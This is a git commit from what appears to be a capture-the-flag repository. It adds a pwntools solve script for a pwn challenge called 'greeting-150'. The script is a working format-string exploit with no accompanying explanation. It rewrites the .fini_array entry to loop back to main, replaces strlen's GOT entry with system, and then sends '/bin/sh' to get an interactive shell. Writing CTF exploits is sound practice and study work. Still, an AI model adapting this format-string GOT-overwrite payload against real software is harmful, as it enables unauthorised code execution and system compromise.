7dc43c05feef29b4e34804929cd4898ad98b10f1
zh1x1an <shiftblink219@gmail.com>
2020-09-12 02:50:44 +0800

    renamed:    pwn_high2/greeting-150/1330703b472c4eaab999ffc141717c64 -> pwn_high2/greeting-150/greeting-150 	new file:   pwn_high2/greeting-150/solve_greeting-150.py

---
+++ pwn_high2/greeting-150/solve_greeting-150.py
@@ -0,0 +1,26 @@
+from pwn import *
+# from LibcSearcher import *
+context(log_level='debug',terminal=["tmux","splitw","-h"])
+binary = "./greeting-150"
+# libc_binary = "./"
+
+p = process(argv=[binary])
+# p = remote("",)
+
+elf = ELF(binary)
+# libc = ELF(libc_binary)
+
+fini_addr = 0x8049934 # -> 0x80485a0
+main_addr = 0x80485ED
+strlen_got = elf.got["strlen"] # 0x8049A54 -> 0xf7dd6520
+system_got = elf.sym["system"] # 0x8048490
+
+context.arch = "i386"
+payload = flat([
+    fini_addr,strlen_got+2,strlen_got,
+    "%{}c%12$hhn%{}c%13$hn%{}c%14$hn".format(0xed-2-18-12,0x804-0xed,0x8490-0x804)
+])
+
+p.sendlineafter("Please tell me your name... ","aa"+payload)
+p.sendlineafter("Please tell me your name... ","/bin/sh")
+p.interactive()
